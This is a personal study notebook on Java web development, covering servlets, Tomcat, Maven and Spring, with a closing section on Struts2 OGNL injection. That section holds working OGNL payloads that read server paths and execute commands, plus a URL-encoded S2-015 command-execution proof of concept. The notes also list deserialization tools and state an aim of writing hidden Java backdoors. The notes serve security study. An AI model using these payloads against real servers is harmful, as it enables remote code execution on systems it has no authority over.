# Java Web笔记（框架与漏洞利用）

by Hence Zhang@Lancet



target： 熟悉大部分的java web 系统与环境的搭建与使用，熟悉java web 常用架构的运行流程，了解java web的开发流程，项目结构，基本配置，项目编译与运行，熟练使用java web相关的基本工具。能够实现简易的java web的开发，快速阅读Java web的代码，对常见的java web的漏洞有深刻的理解; 掌握Java web反序列化漏洞的基本原理以及利用，能通过已有的CVE漏洞的细节，复现出整个攻击流程，以及攻击的payload; Java后门的编写与隐藏



learning process:

1. java SE （I/O 网络编程 java基础语法 异常处理 JDBC 常用API）
2. java OOP
3. java servlet 与 JSP （容器 Filter Listener JSP语法 标签库 EL表达式 MVC AOP IOC）
4. java EE常用框架与技术 （xml/dom  表现层：springmvc/struts  持久层：Hibernate/mybatis   业务层： spring）
5. java web常用工具（版本工具 svn 构建工具 maven/ant 日志框架：log4j 单元测试： Junit  IDE: eclipse/netbeans/intelliJ IDEA)
6. Java web数据库技术 （Oracle JDBC DAO）





resource of reading material：



time schedule:

2-3 weeks ，studying with bitcoin





Some problems encounted in JAVA web:

以coinx的代码为例解读java

1. Java web目录结构

   WEB-INF目录：必须目录 WEB-INF 目录是一个专用区域, 容器不能把此目录中的内容提供给用户

   ​	web.xml：Web应用部署描述文件，必须目录  (Servlet、初始化参数等定义到部署描述文件web.xml)

   ​	classes目录：存放字节码文件

   ​	lib目录：存放第三方类库文件

   ​	TLD文件：标签库描述文件

   META-INF

   其他静态文件：HTML、CSS、JavaScript、图片等

2. Proxooladmin是什么

   proxool是java中jdbc连接池的一种实现，连接池的基本思想是为数据连接建立起一个缓冲池，而后在这个池中预先放入一定量的连接，需要数据库连接时，从缓冲池中取出一个即可。常用的连接池包括: proxool 、 dbcp 、c3p0

   xml配置：

   ```xml
   <servlet>  
     <servlet-name>ServletConfigurator</servlet-name>  
     <servlet-class>  
       org.logicalcobwebs.proxool.configuration.ServletConfigurator</servlet-class>  
     <init-param>  
       <param-name>xmlFile</param-name>  
       <param-value>WEB-INF/proxool.xml</param-value>  
     </init-param>  
     <load-on-startup>1</load-on-startup>  
   </servlet>  
   <servlet>  
     <servlet-name>proxoolAdmin</servlet-name>  
     <servlet-class>org.logicalcobwebs.proxool.admin.servlet.AdminServlet</servlet-class>  
   </servlet>  
   <servlet-mapping>  
     <servlet-name>proxoolAdmin</servlet-name>  
     <url-pattern>/proxool_admin</url-pattern>  
   </servlet-mapping>
   ```

   ​

3. java web基本的概念 （servlet，filter，taglib，listener，dispatch）

4. Java web 的log机制：

   ​

5. spring web介绍：

   利用maven构建java web的项目（spring）

   mvn archetype:generate -DgroupId=com.spring -DartifactId=SpringMVC -DarchetypeArtifactId=maven-archetype-webapp -DinteractivMode=false -DarchetypeCatalog=internal



​	java com spring:存放java处理逻辑的类

​	resource：spring，mybatis等配置文件，sql映射文件（类似ORM？）

​	webapp 存放web应用源码



​	pom.xml 项目的包依赖

​	web.xml

​	context-param 在初始化servlet之前初始化的上下文参数



​	filter 与 filter-mapping 过滤器的实现类与过滤器的绑定URL

​	filter能对servlet请求的对象和响应进行检查和修改

​	Servlet过滤器可以过滤的Web组件包括Servlet，JSP和HTML等文件

​	所有的过滤器都必须引用java.servlet.filter,并实现该接口中的三个方法：init dofilter destroy

 	filter的相关配置：

```Xml
<filter>
      <filter-name>LoginFilter</filter-name>
      <filter-class>com.itzhai.login.LoginFilter</filter-class>
      <init-param>
          <param-name>username</param-name>
          <param-value>arthinking</param-value>
      </init-param>
  </filter>
```





6. Servlet

   servlet容器 tomcat jetty

   tomcat 容器模型：

   tomcat -> container -> engine -> host -> service -> context -> wrapper

   context容器直接管理容器中servlet的wrapper，一个context对应一个web工程

   ContextConfig 负责整个web应用的配置解析工作

   Tomcat 的启动逻辑是基于观察者模式（listener）设计的，所有容器的的修改和状态的改变都会通知已经注册的listener

   ContextConfig 的 init 方法将会主要完成以下工作：

   1. 创建用于解析 xml 配置文件的 contextDigester 对象
   2. 读取默认 context.xml 配置文件，如果存在解析它
   3. 读取默认 Host 配置文件，如果存在解析它
   4. 读取默认 Context 自身的配置文件，如果存在解析它
   5. 设置 Context 的 DocBase

   web应用的初始化：ContextConfig 的 configureStart 方法中实现，主要是解析web.xml文件

   web.xml 文件中的各个配置项将会被解析成相应的属性保存在 WebXml 对象中，随后将webxml中对象的属性设置到context容器中，包括servlet，filter和listener



​	 Servlet 的 load-on-startup 配置项大于 0，那么在 Context 容器启动的时候就会被实例化

​	默认的servlet： defaultservlet    jspservlet



​	与servlet主动关联的三个类：ServletConfig、ServletRequest 和 ServletResponse



​	servlet中的listener：

​	事件监听（eventlistener) servlet context attribute listener，servlet request  attribute listener，servlet request listener，http session atttribute listener

​	生命周期监听（lifecycle listener） servlet context listener ，http session listener



7. spring dwr

   DWR (Direct Web Remoting) 是一个用于改善 Web 页面与 Java 类交互的远程服务器端 Ajax 开源框架。DWR 可以动态生成基于 Java 类的 JavaScript 代码



8. spring mvc配置文件dispatcher-servlet.xml




9. Java web IDE



10. spring framework 基本搭建

    install spring web in ubuntu 14.04

    - apt-get install default-jdk. (Default version java 1.7)
    - apt-get install tomcat7
    - apt-get install maven (version 3)







11. Java web lightweight  IDE:

    [Spring boot](https://github.com/spring-projects/spring-boot) 

    a lightweight jetty deployment project in github

    [Jetty Bootstrap](http://jetty-bootstrap.io/) 

    [Jetty Gradle Hello World](https://github.com/ziroby/jetty-gradle-hello-world) 



REST: representational state transfer

client use four kinds of method : PUT DELETE GET POST to manipulate the resource in the server-side, to realize the fuction of state transfer

12. Java 构建工具 gradle，maven，ant

    gradle：使用groovy语言实现的构建java项目的框架，更有价值的是gradle的插件，可以将Maven pom.xml 文件转换为一个 Gradle 脚本

    ​

13. java平台上OOP语言 Groovy

    可以动态地编译成jvm的字节码，并与其它的java代码和库进行交互

    groovy可以看成java语言的扩展，并且有着各种oop脚本语言的语法特性

    gradle使用groovy实现

    groovy的DSL特性（domain specific language) 为某个特定领域设计的专用语言 ex： makefile sql and etc
    
    
###the analysis of java web vulnerability
struts2

a thought: establish some of the vulnerable env for java web , the details and the analysis included. it would be fantastic when done.

java deserialization

java jndi expression

java deserialize tool: ysoserial

java deserialization cheat sheet:
 https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet
 
 java deserialization cheat sheet2:
 https://xz.aliyun.com/t/2042

    
###JNDI
Java Naming and Directory Interface

Consist of: JNDI API & JNDI SPI(service provider interface)

LDAP/DNS/NIS/NDS/RMI/CORBA

RMI（Java Remote Method Invocation Registry）

JNDI is divided into 5 packages:
javax.naming
javax.naming.directory
javax.naming.ldap
javax.naming.event
javax.naming.spi


### java web skills tree

build tools: maven && gradle
logging framework: log4j slf4j
unit test: junit testNG
IDE: Eclipse

some basic knowledge in javaSE:

* the exception handle
* the IO stream
* JDBC
* reflection mechanism
* concurrent
* JVM


servlet/jsp:

* tomcat/jetty web container
* servlet API/Filter/Listener
* JSP
* JSTL
* lifetime cycle


the light java-EE technologies:
* DOM tech
* struts2 / spring MVC
* Hibernate/ Mybatis
* Spring


Advance java:
* Soap
* load balance
* the swamp
* EJB
* JTA

    ​
###OGNL表达式
OGNL （object-graph navigation language)
kind of expression language( EL)

It could get/set the arbitrary values of an object, call the arbitrary functions by using the concise expression language.

the tree main factor of the OGNL:
* expression 
* root object
* context


### analysis



### maven
(the specific version is in the electronic notebook)

the proxy setting example:
```xml
  <proxies>
    <!-- proxy
 Specification for one proxy, to be used in connecting to the network.
   -->
    <proxy>
      <id>optional</id>
      <active>true</active>
      <protocol>http</protocol>
      <username>proxyuser</username>
      <password>proxypass</password>
      <host>proxy.host.net</host>
      <port>80</port>
      <nonProxyHosts>local.net|some.host.com</nonProxyHosts>
    </proxy>
  </proxies> 
```  

what maven could provide:
builds;
documentation;
reporting;
dependencies;
SCMs;
releases;
distributions;

command to create simple maven project:
mvn -B archetype:generate -DarchetypeGroupId=org.apache.maven.archetypes -DgroupId=com.mycompany.app -DartifactId=my-app
  
pom.xml contains the Project Object Model (POM) for this projects

mvn compile 
mvn test: compile and running the test
mvn test-compile: compile without running the test
mvn package: generate a jar file for this project in /target
mvn install: install jar to .m2/repository

mvn site: customize the maven site
mvn clean: clean the target folder so that everything is clean

snapshot version: the snapshot refers to a latest code along with a development version, might not be stable.


add a plugin in maven:
<build>
  <plugins>
    <plugin>
      <groupId>org.apache.maven.plugins</groupId>
      <artifactId>maven-compiler-plugin</artifactId>
      <version>3.3</version>
      <configuration>
        <source>1.5</source>
        <target>1.5</target>
      </configuration>
    </plugin>
  </plugins>
</build>

add resource to jar:
anything put in ${basedir}/src/main/resources would be exactly showed at the base of JAR.

for each external dependency, you will need: groupId, artifactId, version, and scope

###IntelliJ IDEA

the differences between the eclipse and the intellij Idea


debug in the IDEA with tomcat7:
there might be some problems with the start up of the tomcat, which refers to the implicit setting of \$catalina_home. 
```shell
export catalina_home=/usr/share/tomcat7
export TOMCAT_HOME=/usr/share/tomcat7
export JAVA_OPTS='-Dcom.sun.management.jmxremote -Dcom.sun.management.jmxremote.port=1099 -Dcom.sun.management.jmxremote.ssl=false -Dcom.sun.management.jmxremote.authenticate=false -Djava.rmi.server.hostname=127.0.0.1'
/usr/share/tomcat7/bin/catalina.sh jpda start

```

tomcat opening port analysis:

8080 web server
8005 server-shutdown port (could be used to shutdown the tomcat server)
8009 AJP port (could be utilized to deploy the war file)

1099 JMX(java management extension port ,using the rmi or something else to control the MBean)

the payload to obtain the tomcat path:
%{"tomcatBinDir{"+@java.lang.System@getProperty("user.dir")+"}"}



the payload to obtain the web path:

%{#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),#response.println(#req.getRealPath('/')),#response.flush(),#response.close()}

the payload to execute the command:

%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"whoami"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}


the code to execute OGNL in the struts2-1:

```java
 Object o = stack.findValue(var, asType)
```
 
 the definition of the findValue method：
 
 ```java
     public Object findValue(String expr, Class asType) {
        Object var4;
        try {
            Object value;
            if (expr == null) {
                value = null;
                return value;
            }

            if (this.overrides != null && this.overrides.containsKey(expr)) {
                expr = (String)this.overrides.get(expr);
            }

            value = OgnlUtil.getValue(expr, this.context, this.root, asType);
            if (value == null) {
                var4 = this.findInContext(expr);
                return var4;
            }

            var4 = value;
            return var4;
        } catch (OgnlException var9) {
            var4 = this.findInContext(expr);
        } catch (Exception var10) {
            this.logLookupFailure(expr, var10);
            var4 = this.findInContext(expr);
            return var4;
        } finally {
            OgnlContextState.clear(this.context);
        }

        return var4;
    }
 ```
 
 the exact position of ognl parsing：
 ```java
 OgnlUtil.getValue(expr, this.context, this.root, asType);
 ```
 
 the mechanism of validation in struts2 relies on two interceptors, **validation** and **workflow**.
 The validation interceptor will create an error checking list according to the xml configuration file, by which the workflow interceptor would check the existing form for possible errors.
 
 under the default configuration, the workflow will detect then handle with the form's errors, and instantly return the handling result after it try to parse user input in form with altSyntax.
 
 altSyntax could parse the OGNL expression resorting to the open-source widget: xwork.
 
  
  
  s2-015:
  
  the proof of concept 
  the command execution payload:
  /struts2_15_war_exploded/%24%7b%23%61%3d%28%6e%65%77%20%6a%61%76%61%2e%6c%61%6e%67%2e%50%72%6f%63%65%73%73%42%75%69%6c%64%65%72%28%6e%65%77%20%6a%61%76%61%2e%6c%61%6e%67%2e%53%74%72%69%6e%67%5b%5d%7b%22%77%68%6f%61%6d%69%22%7d%29%29%2e%72%65%64%69%72%65%63%74%45%72%72%6f%72%53%74%72%65%61%6d%28%74%72%75%65%29%2e%73%74%61%72%74%28%29%2c%23%62%3d%23%61%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%2c%23%63%3d%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%49%6e%70%75%74%53%74%72%65%61%6d%52%65%61%64%65%72%28%23%62%29%2c%23%64%3d%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%42%75%66%66%65%72%65%64%52%65%61%64%65%72%28%23%63%29%2c%23%65%3d%6e%65%77%20%63%68%61%72%5b%35%30%30%30%30%5d%2c%23%64%2e%72%65%61%64%28%23%65%29%2c%23%66%3d%23%63%6f%6e%74%65%78%74%2e%67%65%74%28%22%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%64%69%73%70%61%74%63%68%65%72%2e%48%74%74%70%53%65%72%76%6c%65%74%52%65%73%70%6f%6e%73%65%22%29%2c%23%66%2e%67%65%74%57%72%69%74%65%72%28%29%2e%70%72%69%6e%74%6c%6e%28%6e%65%77%20%6a%61%76%61%2e%6c%61%6e%67%2e%53%74%72%69%6e%67%28%23%65%29%29%2c%23%66%2e%67%65%74%57%72%69%74%65%72%28%29%2e%66%6c%75%73%68%28%29%2c%23%66%2e%67%65%74%57%72%69%74%65%72%28%29%2e%63%6c%6f%73%65%28%29%7d.action
  
  
the vulnerability(s2-007) could not be replayed with the env of s2-001, might account for the order of the vulnerability trigger, since the s2-001 is trigged before the s2-007``
  
  
  
###basic java se language feature and learning
  
  should not waste too much time on this topic


###the ongl jndi deserialization example
  
  tutorial for ONGL injection:
  https://pentest-tools.com/blog/exploiting-ognl-injection-in-apache-struts/
  
  struts2: designed to streamline the development cycle from building, deploying and maintaining applications.
  
  apache coyote, the connector supports http, allows communication with apache catalina
  
  apache catalina determines which servlet to be used to according to the request.
   
   
   
###resin

a kind of middleware

   


